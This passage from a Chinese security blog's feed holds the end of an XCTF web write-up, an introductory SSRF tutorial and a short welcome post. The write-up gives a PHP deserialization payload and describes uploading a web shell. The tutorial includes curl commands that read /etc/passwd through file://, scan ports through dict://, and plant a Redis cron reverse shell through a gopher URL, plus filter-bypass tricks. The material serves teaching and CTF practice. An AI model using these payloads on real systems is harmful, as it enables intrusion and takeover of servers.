class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">"xctf"</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">"flag"</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;  <span class="comment"># payload</span></span><br></pre></td></tr></table></figure><h3 id="upload1">upload1</h3><p>考点为文件上传前端过滤绕过，发现只能上传jpg文件，查看源码看到在前端有一个js函数对文件后缀进行检测，先将php改为jpg后缀，再使用burpsuite抓包修改文件后缀即可绕过，成功上传一句话木马后菜刀连接即可得flag。</p><h3 id="Web-include-php">Web include php</h3><p>考点为php源码审计与php://input流，利用strstr大小写敏感绕过strstr函数，使用php://input流读取文件即可得flag，源码及简要如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);  <span class="comment">//展示代码</span></span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'hello'</span>];    <span class="comment">//获取hello参数</span></span><br><span class="line">$page=$_GET[<span class="string">'page'</span>];    <span class="comment">//获取page参数</span></span><br><span class="line"><span class="keyword">while</span> (strstr($page, <span class="string">"php://"</span>)) &#123;   <span class="comment">//查询page参数中是否有php://，有的话返回page参数</span></span><br><span class="line">    $page=str_replace(<span class="string">"php://"</span>, <span class="string">""</span>, $page);     <span class="comment">//将page参数中的 php:// 替换掉</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($page);     <span class="comment">//引用page</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// strstr()</span></span><br><span class="line"><span class="comment">// 定义和用法</span></span><br><span class="line"><span class="comment">// strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。</span></span><br><span class="line"><span class="comment">// 注释：该函数是二进制安全的。</span></span><br><span class="line"><span class="comment">// 注释：该函数是区分大小写的。如需进行不区分大小写的搜索，请使用 stristr() 函数。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// strstr(string,search,before_search)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数描述</span></span><br><span class="line"><span class="comment">// string</span></span><br><span class="line"><span class="comment">// 必需。规定被搜索的字符串。</span></span><br><span class="line"><span class="comment">// search</span></span><br><span class="line"><span class="comment">// 必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</span></span><br><span class="line"><span class="comment">// before_search</span></span><br><span class="line"><span class="comment">// 可选。一个默认值为 "false" 的布尔值。如果设置为 "true"，它将返回 search 参数第一次出现之前的字符串部分。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="结语">结语</h2><p>这部分wp到这就结束了，其实之前也有想过，这样的wp网上到处都是，何必要重写呢？后面想想，如果把题目wp放在一起，并且能够把相应的知识点提一下还是挺不错的，至少看起来对于实验室的同学们来说提升得挺快的，全篇没有给出flag，甚至有的题只给了个思路，但是我觉得这样就可以了，看wp看到就是思路，看着自己没想到的思路去做题复现，也许更容易把题目吃透吧？如果有什么不明白的，或者有什么更好的思路，欢迎<a href="mailto:xiaoz34130@gmail.com">邮件联系</a>。</p>]]></content>
    
    <summary type="html">
    
      xctf上的oj对ctf新手来说，算是比较友好的，由浅入深的题目，除了有一些脑洞题外，其他基本都还算是可以的，给实验室的ctf队伍做讲解交流，也是一直推荐大家去刷一下，出了新手村，把进阶题做好，基本对于一些常见的漏洞和题型能够有了解了。趁着有时间，整理一下之前的wp放上来，不仅可以提供给实验室同学参考，也希望能给其他想做这个平台上题目的人一些帮助。不过，做CTF题，还是建议先自己想，自己钻研，把能想的都想透，实在没办法了再看wp,给自己一些提示，然后继续去做，做完自己尝试复现，这样才能把一道题目吃得更深更透。
    
    </summary>
    
    
      <category term="CTF_web_wp" scheme="http://yoursite.com/categories/CTF-web-wp/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>SSRF简介-小白文</title>
    <link href="http://yoursite.com/2019/09/15/SSRF%E7%AE%80%E4%BB%8B-%E5%B0%8F%E7%99%BD%E6%96%87/"/>
    <id>http://yoursite.com/2019/09/15/SSRF%E7%AE%80%E4%BB%8B-%E5%B0%8F%E7%99%BD%E6%96%87/</id>
    <published>2019-09-15T11:21:09.000Z</published>
    <updated>2019-12-23T12:45:13.281Z</updated>
    
    <content type="html"><![CDATA[<p>因为近期给实验室想做ctf web方向的同学做一些交流，所以回头对SSRF漏洞进行了一些总结和归纳，多数还是来自于网上的各种资料，部分为自己的一些理解。比较偏向基础，关于更加深入的东西，可以详看文中附的链接，分析些源码，复现下环境和攻击。</p><h2 id="漏洞简介">漏洞简介</h2><p>SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者利用服务器提供的访问接口或参数来控制服务器端发起请求的一个安全漏洞。一般来说，SSRF攻击的目标是外网无法访问的内网系统（文件、主机、端口等）。之所以能够对内网进行访问，因为服务端对外网攻击者开放，而服务端本身是处于内网中的，由服务器本身发起的请求对于内网中的系统一般来说都是有效的。<br>归根到底，SSRF形成的原因在于服务端没有对，目标地址做过滤和限制，并且服务端对外提供了从其他服务器或应用获取数据的功能，这就导致请求和目标地址不可控制，在攻击者的精心构造下，利用服务端发送伪造的请求，使用有缺陷的web应用作为代理对服务端的网络系统进行攻击。</p><p>一个例子：<br>在php中，使用Curl进行资源访问请求</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">curl_init()       <span class="comment">//初始化一个curl会话</span></span><br><span class="line">curl_setopt()     <span class="comment">//设置一个curl传输选项</span></span><br><span class="line">    <span class="comment">//bool curl_setopt ( resource $ch , int $option , mixed $value )</span></span><br><span class="line">    <span class="comment">//ch：curl_init()返回的curl句柄</span></span><br><span class="line">    <span class="comment">//option：需要设置的CURLOPT_XXX选项</span></span><br><span class="line">    <span class="comment">//value：设置在option选项上的值</span></span><br><span class="line">    </span><br><span class="line">curl_exec()       <span class="comment">//执行一个curl会话</span></span><br><span class="line">curl_close()      <span class="comment">//关闭一个curl会话</span></span><br><span class="line"></span><br><span class="line">CURLOPT_URL    <span class="comment">//需要获取的URL地址，也可以在curl_init()函数中设置</span></span><br><span class="line">CURLOPT_FOLLOWLOCATION      <span class="comment">//启用时可将服务器返回的'Location'放在header递归</span></span><br><span class="line">                    <span class="comment">//的返回给服务使用CURLOPT_MAXREDIRS可以限定递归返回的数量</span></span><br><span class="line"> </span><br><span class="line">CURLOPT_HEADER      <span class="comment">//启用时会将头文件的信息作为数据流输出</span></span><br><span class="line">CURLOPT_PROTOCOLS   <span class="comment">//CURLPROTO_*的位域指，使用时可限定libcurl在传输过冲中可以</span></span><br><span class="line">                    <span class="comment">//使用的协议</span></span><br><span class="line">CURLPROTO_HTTP      <span class="comment">//指定libcurl使用http协议</span></span><br><span class="line">CURLPROTO_HTTPS     <span class="comment">//指定libcurl使用https协议</span></span><br></pre></td></tr></table></figure><p>在上面的例子中，服务器允许用户通过指定URL，服务端使用curl发起网络请求后返回客户端，请求加载文件。<br>这利用上述代码的一个很简单的SSRF的例子，通过使用file协议访问服务端的其他数据文件：<br><a href="http://127.0.0.1/ssrf.php?url=file:///c:%5CUsers%5Ch%5CDesktop%5Chello.txt" target="_blank" rel="noopener">http://127.0.0.1/ssrf.php?url=file:///c:\Users\h\Desktop\hello.txt</a></p><p>综上，其实SSRF漏洞的根源在于对于请求没有进行过滤，从而导致攻击者可以利用服务端的web应用访问其他非授权的信息或文件</p><h2 id="SSRF主要攻击面">SSRF主要攻击面</h2><p>主要可实施的攻击<br>1.对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息(软件开发商，软件名称、版本、服务类型等信息，通过这些信息可以使用某些工具直接去使用相对应的exp去攻击)；<br>2.对内网或本地的应用程序进行攻击，攻击方式可能是溢出；<br>3.对内网的web应用进行指纹识别，通过访问默认文件实现；<br>4.攻击内网的web应用，主要为使用GET参数就可以进行的攻击（比如sqli、strusts2等）；<br>5.利用file协议读取本地文件等。</p><h2 id="SSRF漏洞出现的场景">SSRF漏洞出现的场景</h2><h3 id="漏洞出现的场景">漏洞出现的场景</h3><p>1.能够对外发起网络请求的地方，就可能存在SSRF漏洞；<br>2.从远程服务器请求资源（Upload from URL, Import &amp; Export RSS Feed）；<br>3.数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）；<br>4.Webmail收取其他邮箱插件（POP3、IMAP、SMTP）；<br>5.文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）。</p><h3 id="漏洞出现点">漏洞出现点</h3><p>1.分享：通过URL地址分享网页内容<br>2.转码服务<br>3.在线翻译<br>4.图片加载与下载：通过URL地址加载或下载图片<br>5.图片、文章收藏功能<br>6.未公开的api实现以及其他调用URL的功能<br>7.从URL关键字中寻找</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">share  </span><br><span class="line">wap  </span><br><span class="line">url</span><br><span class="line">file</span><br><span class="line">link  </span><br><span class="line">src  </span><br><span class="line"><span class="built_in">source</span>  </span><br><span class="line">target  </span><br><span class="line">u</span><br><span class="line">3g  </span><br><span class="line">display  </span><br><span class="line">sourceURl  </span><br><span class="line">imageURL  </span><br><span class="line">domain</span><br><span class="line">page</span><br><span class="line">file </span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="PHP中容易造成漏洞的函数">PHP中容易造成漏洞的函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">curl_exec()   <span class="comment">//执行curl命令</span></span><br><span class="line">file_get_contents()    <span class="comment">//读取文件到字符串中</span></span><br><span class="line">fsockopen()   <span class="comment">//打开一个网络连接或者一个Unix套接字连接</span></span><br></pre></td></tr></table></figure><h3 id="curl-exec">curl_exec()</h3><p>参考上文</p><h3 id="file-get-contents">file_get_contents()</h3><p>参考：<a href="https://www.php.net/manual/en/function.file-get-contents.php" target="_blank" rel="noopener">https://www.php.net/manual/en/function.file-get-contents.php</a><br>格式：<br>file_get_contents(path,include_path,context,start,max_length)</p><p>与file()函数类似，但是这个函数可以从指定的开始位置读取指定长度的文件数据，并将文件读取成字符串中输出，如果读取失败，则返回FALSE。另外，如果操作系统支持，该函数可以使用内存映射来改善性能。<br>另：如果打开的URL中有特殊字符，则需要使用 urldecode() 进行URL编码<br>参数说明：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">path            <span class="comment">#必需，请求的文件名</span></span><br><span class="line">include_path    <span class="comment">#可选，如果需要在include_path（在 php.ini 中）中搜索文件的话，需要设置该参数为 '1'。</span></span><br><span class="line">context         <span class="comment">#可选，规定文件上下文句柄，context是一套可以修改流行为的选项，不使用可跳过</span></span><br><span class="line">start           <span class="comment">#可选，规定文件中开始读取的位置，从PHP 5.1开始使用</span></span><br><span class="line">max_length      <span class="comment">#可选，规定读取的字节数，从PHP5.1开始使用</span></span><br></pre></td></tr></table></figure><h3 id="fsockopen">fsockopen()</h3><p>参考：<a href="https://www.php.net/manual/zh/function.fsockopen.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.fsockopen.php</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//格式：</span></span><br><span class="line">fsockopen ( string $hostname [, int $port = <span class="number">-1</span> [, int &amp;$errno [, string &amp;$errstr [, float $timeout = ini_get(<span class="string">"default_socket_timeout"</span>) ]]]] ) : resource</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化一个套接字连接到指定主机（hostname）。</span></span><br><span class="line"><span class="comment">//PHP支持以下的套接字传输器类型列表 所支持的套接字传输器（Socket Transports）列表。也可以通过stream_get_transports()来获取套接字传输器支持类型。</span></span><br><span class="line"><span class="comment">//参数说明：</span></span><br><span class="line">hostname  <span class="comment">//如果安装了Openssl，则需要在主机名前添加访问协议ssl://或tls://，从而可以使用基于Openssl的客户端连接到远程主机</span></span><br><span class="line">port      <span class="comment">//端口号，如果将其设置为-1，则表示不使用端口，例如 unix://</span></span><br><span class="line">errno     <span class="comment">//如果errno返回值为0，则说明函数返回值为FALSE，错误发生在套接字连接调用之前，最可能的错误是在初始化套接字时发生了错误</span></span><br><span class="line">errstr    <span class="comment">//错误信息将以字符串的形式返回</span></span><br><span class="line">timeout   <span class="comment">//设置连接的时限，单位为s</span></span><br><span class="line">            <span class="comment">//如果要对套接字上的读写操作设置时间，使用straek_set_timeout(),timeout参数只用于套接字连接</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//返回值：</span></span><br><span class="line"><span class="comment">//fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回FALSE。</span></span><br><span class="line"><span class="comment">//错误：</span></span><br><span class="line"><span class="comment">//如果host不可访问，则抛出一个警告级别（E_WARNING）的错误提示。</span></span><br></pre></td></tr></table></figure><h2 id="常见可利用协议">常见可利用协议</h2><p>常用协议参考：<br><a href="https://3wapp.github.io/WebSecurity/%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE.html" target="_blank" rel="noopener">https://3wapp.github.io/WebSecurity/常见协议.html</a></p><p>一些常见的可利用的协议</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FILE                           <span class="comment">#读取服务器上任意文件内容</span></span><br><span class="line">IMAP/IMAPS/POP3SMTP/SMTPS      <span class="comment">#爆破邮件用户名密码</span></span><br><span class="line">FTP/FTPS                       <span class="comment">#FTP匿名访问、爆破</span></span><br><span class="line">DICT                           <span class="comment">#操作内网Redis等服务，扫描端口信息</span></span><br><span class="line">GOPHER                         <span class="comment">#能够将所有操作转成数据流，并将数据流一次发出去，可以用来探测内网的所有服务的所有漏洞</span></span><br><span class="line">TFTP                           <span class="comment">#UDP协议扩展</span></span><br></pre></td></tr></table></figure><h3 id="dict">dict</h3><p>词典服务器协议（DICT）是基于TCP事务的查询/响应协议，它允许客户端从一组自然语言词典数据库访问词典定义。<br>DICT协议旨在提供对多个数据库的访问。可以请求单词定义，可以搜索单词索引（使用一组容易扩展的算法），可以提供有关服务器的信息（例如，支持哪些索引搜索策略，或者哪些数据库可用），以及信息可以提供有关数据库的信息（例如版权，引用或发行信息）。此外，DICT协议具有可用于限制对某些或所有数据库的访问的挂钩。</p><p>协议格式：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dict://&lt;user&gt;;&lt;auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;:&lt;database&gt;:&lt;n&gt;</span><br><span class="line">dict://&lt;user&gt;;&lt;auth&gt;@&lt;host&gt;:&lt;port&gt;/m:&lt;word&gt;:&lt;database&gt;:&lt;strat&gt;:&lt;n&gt;</span><br></pre></td></tr></table></figure><p>其中，&quot;/d&quot; 语法指定DEFINE命令（RFC-2229 3.2节），而 “/m” 指定MATCH命令（RFC-2229 3.3节）。<br>“<user>;<auth>@”,&quot;:<port>&quot;,&quot;<database>&quot;,&quot;<strat>“和”<n>“中的某些或全部可能省略<br>通常省略”<n>&quot;，表示指定查询单词的第n个定义或匹配项。</p><p>如果省略 “<user>;<auth>@”，则不进行身份验证<br>如果省略 “: <port>“，则应使用默认端口2628<br>如果省略 &quot; <database>&quot; ，”!” 应该使用（见3.2节）<br>如果省略 “<strat>”，则为 “.”  应该使用（请参阅第3.3节）</p><p>“<user>; <auth> @” 指定用户名和执行的身份验证类型。<br>对于 “<auth>”，字符串 “AUTH” 指示将执行使用AUTH命令的APOP身份验证</p><p>字符串 “SASLAUTH = &lt;auth_type&gt;” 指示将使用SASLAUTH  和SASLRESP命令，其中 “&lt;auth_type&gt;” 表示将使用的SASL身份验证类型。如果为 “&lt;auth_type&gt;”</p><p>末尾的冒号可以省略，例如以下URL，可能指定定义或匹配项：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dict://dict.org/d:shortcake:</span><br><span class="line">dict://dict.org/d:shortcake:*</span><br><span class="line">dict://dict.org/d:shortcake:wordnet:</span><br><span class="line">dict://dict.org/d:shortcake:wordnet:1</span><br><span class="line">dict://dict.org/d:abcdefgh</span><br><span class="line">dict://dict.org/d:sun</span><br><span class="line">dict://dict.org/d:sun::1</span><br><span class="line"></span><br><span class="line">dict://dict.org/m:sun</span><br><span class="line">dict://dict.org/m:sun::soundex</span><br><span class="line">dict://dict.org/m:sun:wordnet::1</span><br><span class="line">dict://dict.org/m:sun::soundex:1</span><br><span class="line">dict://dict.org/m:sun:::</span><br></pre></td></tr></table></figure><h3 id="file">file</h3><p>本地文件传输协议，File Protocol。主要用于访问本地计算机中的文件。在ssrf中，可以利用其访问服务端本机的文件，在<br>参考：MSDN File Protocol<br>file协议的基本格式如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file:///文件路径</span><br></pre></td></tr></table></figure><p>比如需要打开E盘下txt目录中的index.txt，那么在资源管理器或者浏览器地址栏中输入：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file:///E:/txt/index.txt</span><br></pre></td></tr></table></figure><p>用file:///+文件地址，其实等价于文件的地址。即：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file:///C:/Users/CLi/AppData/Local/Temp/WindowsLiveWriter1627300719/supfiles52F410/wangdan-se-436963[2].jpg</span><br></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:/Users/CLi/AppData/Local/Temp/WindowsLiveWriter1627300719/supfiles52F410/wangdan-se-436963[2].jpg</span><br></pre></td></tr></table></figure><p>URI中为什么本地文件file后面跟三个斜杠？<br>URI的结构为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scheme:[//[user:password@]host[:port]][/]path[?query][<span class="comment">#fragment]</span></span><br></pre></td></tr></table></figure><p>如果有host，前面需要加//，因此对于http或https等网络地址来说会写成：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/lishanleilixin/article/category/7191777</span><br></pre></td></tr></table></figure><p>这样看上去很自然。如果是文件的话，文件没有host，所以中间的host部分就不要了，就变成了:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file:///lishanleilixin/article/category/7191777</span><br></pre></td></tr></table></figure><p>因为如果没有host的话，第一个[]的内容就不存在了，这种同意的写法有一个标准叫CURIE。</p><h3 id="gopher">gopher</h3><p>Gopher 协议在SSRF中属于万金油，可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求，还可以攻击内网未授权MySQL。<br>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。在ssrf时常常会用到gopher协议构造post包来攻击内网应用。其实构造方法很简单，与http协议很类似。<br>不同的点在于gopher协议没有默认端口，所以需要指定web端口，而且需要指定post方法。回车换行使用%0d%0a。注意post参数之间的&amp;分隔符也要进行url编码。<br>总得来说，在SSRF中，基于 TCP Stream 且不做交互的点都可以进行攻击利用。利用Gopher将进行构造的TCP数据流发送到服务端实现攻击。<br>基本协议格式：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure><h2 id="利用方式">利用方式</h2><p>以上面的php代码为例</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#利用file协议任意文件读取</span></span><br><span class="line">curl -v <span class="string">'http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用dict协议查看端口</span></span><br><span class="line">curl -v <span class="string">'http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用gopher协议反弹shell</span></span><br><span class="line">curl -v <span class="string">'http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'</span></span><br></pre></td></tr></table></figure><p>对上述进行防御<br>使用下面代码：<br>限制协议为HTTP、HTTPS<br>设置跳转重定向为True（默认不跳转）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">True</span>);</span><br><span class="line">    <span class="comment">// 限制为HTTPS、HTTP协议</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时dict协议无效，但是可以利用302跳转来绕过http限制</p><h2 id="常见的过滤与绕过">常见的过滤与绕过</h2><h3 id="常见的过滤">常见的过滤</h3><p>过滤开头不是http://xxx.com的所有链接<br>过滤格式为ip的链接，比如127.0.0.1<br>结尾必须是某个后缀</p><h3 id="绕过方法">绕过方法</h3><p>http基础认证<br><a href="http://xxx.com@attacker.com" target="_blank" rel="noopener">http://xxx.com@attacker.com</a><br>利用302跳转（<a href="http://xip.io" target="_blank" rel="noopener">xip.io</a>，<a href="http://www.tinyrul.com" target="_blank" rel="noopener">www.tinyrul.com</a>）<br>• 当我们访问xip.io的子域，比如127.0.0.1.xip.io的时候，实际上会被自动重定向到127.0.0.1<br>• 如果利用上面的方法会被检测127.0.0.1的话，可以利用www.tinyurl.com提供的服务来进行绕过<br>加上#或?即可<br>更改其他进制的ip</p><h2 id="防范方法">防范方法</h2><p>• 限制协议为HTTP、HTTPS<br>• 不用限制302重定向<br>• 设置URL白名单或者限制内网IP</p><h2 id="参考">参考</h2><p>SSRF详解：<br><a href="https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://damit5.com/2018/05/26/SSRF-漏洞学习/</a><br><a href="https://wcute.github.io/2018/12/12/SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://wcute.github.io/2018/12/12/SSRF漏洞学习/</a><br><a href="https://www.jianshu.com/p/86bb349baac1" target="_blank" rel="noopener">https://www.jianshu.com/p/86bb349baac1</a></p><p>SSRF环境复现：<br><a href="https://forum.90sec.com/t/topic/176" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/176</a><br>进阶环境搭建：<br><a href="https://github.com/incredibleindishell/SSRF_Vulnerable_Lab" target="_blank" rel="noopener">https://github.com/incredibleindishell/SSRF_Vulnerable_Lab</a></p><p>Gopher-SSRF-redis:<br><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf攻击内网应用复现/</a><br>Gopher-SSRF-MYSQL:<br><a href="http://shaobaobaoer.cn/archives/643/gopher-8de8ae-ssrf-mysql-a0e7b6" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/643/gopher-8de8ae-ssrf-mysql-a0e7b6</a><br>利用Gopher扩展攻击面：<br><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">https://blog.chaitin.cn/gopher-attack-surfaces/</a></p>]]></content>
    
    <summary type="html">
    
      关于SSRF的一些简单介绍，一些常见的攻击场景和攻击面，比较偏向基础。因为近期给实验室想做ctf web方向的同学做一些交流，所以回头对SSRF漏洞进行了一些总结和归纳，多数还是来自于网上的各种资料，部分为自己的一些理解。比较偏向基础，关于更加深入的东西，可以详看文中附的链接，分析些源码，复现下环境和攻击。
    
    </summary>
    
    
      <category term="Web漏洞介绍" scheme="http://yoursite.com/categories/Web%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/"/>
    
    
      <category term="Web漏洞" scheme="http://yoursite.com/tags/Web%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="SSRF" scheme="http://yoursite.com/tags/SSRF/"/>
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>写在前面</title>
    <link href="http://yoursite.com/2019/09/03/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2/"/>
    <id>http://yoursite.com/2019/09/03/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2/</id>
    <published>2019-09-03T11:40:56.000Z</published>
    <updated>2019-12-24T05:11:22.262Z</updated>
    
    <content type="html"><![CDATA[<p>终于，又回来了！</p><p>上次博客更新，还是在CSDN上，后续想自己搭建个博客，又因为各种原因没搭起来（归根到底还是懒…）<br>其实也不是没有写博客，很多内容都还静静躺在电脑硬盘里…<br>终于，现在终于狠下心弄好了，可以把之前积累的一些东西陆陆续续整理下发出来了。</p><h2 id="为什么写博客？">为什么写博客？</h2><p>为了记录，为了对自己所学的梳理，也是为了能够给其他人提供一些参考和帮助。</p><p>记得最开始在CSDN上写博客，也没想那么多，还是因为班上同学间常会交流一些问题，有的时候自己嘴太笨，和大家挨个讲经常会有讲不清楚的地方，于是总觉得自己得有个地方，能够将这些学到的以及遇到的一些知识和问题记录下来，也能够给希望了解一些东西的同学或朋友一个也许能够获得参考的地方，于是，开始在CSDN上有了自己的博客。</p><p>但是令我没想到的是，自己写的这些东西，本来一直以为自己写的内容粗浅不堪琢磨，纯粹为了给同学间交流的内容，后来还是有挺多人看的，估计对于他们，那些文章多少还是能够有些帮助吧。</p><p>我想，博客的作用与价值，于自己而言，应该是通过梳理和记录，帮助自己更好地提升，加深自己的理解；而更大的价值在于，或许和自己志同道合的人能够在这里得到一些参考，一些启发，一些帮助？</p><h2 id="为什么不在CSDN上了？">为什么不在CSDN上了？</h2><p>有点丑算原因吗？确切地说，是因为想要有一个属于自己的空间，能够自己DIY的空间。而自己搭建博客，无疑是一个最好最符合的方法，不管是内容的书写上，还是页面的设计，以及空间和域名，都可以自己DIY，或许自己创造的才是最好的？</p><h2 id="That’s-all-欢迎来到这里，希望能够对你有所帮助。">That’s all, 欢迎来到这里，希望能够对你有所帮助。</h2>]]></content>
    
    <summary type="html">
    
      终于，又回来了！
    
    </summary>
    
    
    
  </entry>
  
</feed>
